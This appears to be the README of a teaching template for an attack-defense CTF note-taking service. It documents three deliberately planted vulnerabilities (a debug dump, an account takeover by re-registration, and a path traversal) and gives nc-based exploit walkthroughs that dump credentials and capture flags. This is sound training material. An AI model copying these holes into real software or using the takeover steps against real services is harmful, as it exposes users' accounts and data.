n0t3b00k example service
====================
Example service to provide students a project strucutre. n0t3b00k is a simple service that allows users to register, login and save/retrieve notes. 


# Vulnerabilities

Please keep track of your intended vulnerabilities here:

## Debug enabled

- Category: Misconfiguration
- Difficulty: Easy

When `self.debug` is set to `True`, the `dump` command will list all users and their notes. 

## Account Takeover

- Category: Authentication
- Difficulty: Medium

When registering a new user, the service does not check if the user already exists and simply overwrites the password (`self.users[reg_user] = reg_pw`). The list of existing users can be obtained with the `user` command.

## Arbitrary Read or Write 

- Category: Path traversal
- Difficulty: hard?

The `FilesystemDict` uses user-supplied input when constructing the file paths. This could be used to write JSON-encoded data to any files. The impact has to be further analyzed, but this might lead to another account takeover (overwrite the password for other users) or flag access (reading the `notes` files).

*Note:* Without a proper impact analysis, we would classify this issue as a `unintended` vulnerability. Please try to keep such issues to a minimum, but document them nonetheless.

# Exploits

For each vulnerability, you should have a working example exploit ready! 

## Debug enabled:

Connect to the service and run `dump`:

```
gehaxelt@LagTop ~> nc 192.168.2.112 2323
Welcome to the 1337 n0t3b00k!
> dump
Users:
test:test
foo:bar
     Note 0:acbd18db4cc2f85cedef654fccc4a4d8:foo
     Note 1:37b51d194a7513e45b56f6524f2d51f2:bar
     Note 2:acbd18db4cc2f85cedef654fccc4a4d8:foo
4FOBMO10HWLC:EDPWN79U2KNL
I4K3P0SK3PST:CK5FALD39Y0S
B70YKMW72KUR:79Y5IM7FD7O8
GB7QC0DKYXPS:89TY8HI6OCBA
NXPTITQUSN2M:WYIWSGRZNKTX
6699DPYPAQDL:7IFEPP3P3LBI
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
MPG81XWFHNE8:H8KP8VECBQOR
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
QN973IXF53HT:9BUVY6JNMGIW
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
UI2WTY7E7KC5:87SB830QHVX3
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
XXPLIXZ9ZN1Q:F88L3J4GA2LE
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
N43LU1348D19:YWT9TFCSVA2T
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
3DP6COPE6GMX:OI9437MJORZR
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
I8ZUNTWZ0Y0Q:B3AI1LN9SAAE
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
JUACZ5J3D475:5RNZ1ETOFBS6
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
KGFZNGHROLUS:05826L6X39XM
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
FV9VM13K8MGF:POUIW5CM6PY2
     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
XAHOKR4QD63O:VENSD82XO1XM
     Note 0:199480a3640248d5ea679b596d91c350:SKLNAYZAG7QX65RTMW3DCZAKPS9OC0TFH6GH
```

The flags are in the output.

## Account Takeover

Connect to the service and use the `user` command to obtain a list of users:

```
gehaxelt@LagTop ~ [130]> nc 192.168.2.112 2323
Welcome to the 1337 n0t3b00k!
> user
User 0: test
User 1: foo
User 2: 4FOBMO10HWLC
User 3: I4K3P0SK3PST
User 4: B70YKMW72KUR
User 5: GB7QC0DKYXPS
User 6: NXPTITQUSN2M
User 7: 6699DPYPAQDL
User 8: MPG81XWFHNE8
User 9: QN973IXF53HT
User 10: UI2WTY7E7KC5
User 11: XXPLIXZ9ZN1Q
User 12: N43LU1348D19
User 13: 3DP6COPE6GMX
User 14: I8ZUNTWZ0Y0Q
User 15: JUACZ5J3D475
User 16: KGFZNGHROLUS
User 17: FV9VM13K8MGF
User 18: XAHOKR4QD63O
```

Use the username(s) and the `reg` command to set a different password. Next, `log`in as the user, `list` their notes and obtain the flag:

```
> reg XAHOKR4QD63O foo
User successfully registered
> log XAHOKR4QD63O foo
Successfully logged in!
> list 
Note 0: 199480a3640248d5ea679b596d91c350
> get 199480a3640248d5ea679b596d91c350
SKLNAYZAG7QX65RTMW3DCZAKPS9OC0TFH6GH
```

## Arbitrary Read or Write

TODO: None developed yet.

=========================================================

# Usage

Use this repository as the base structure for your service. Please keep the directory structure and the following required files:

- `README.md` with a description of your vulnerabilities and exploits.
- `LICENSE` with the MIT
- `.gitignore` files exclude directories or files from being committed.
- `.dockerignore` files exclude directories or files from being tracked by the docker daemon.
- `.env` files used by docker-compose to assign a unique project-name.
- `docker-compose.yml` files to manage your service or checker containers
- `Dockerfile` with commands to build your service

# Required changes

You'll probably want to through all of these files and replace `n0t3b00k` with your service's name accordingly. 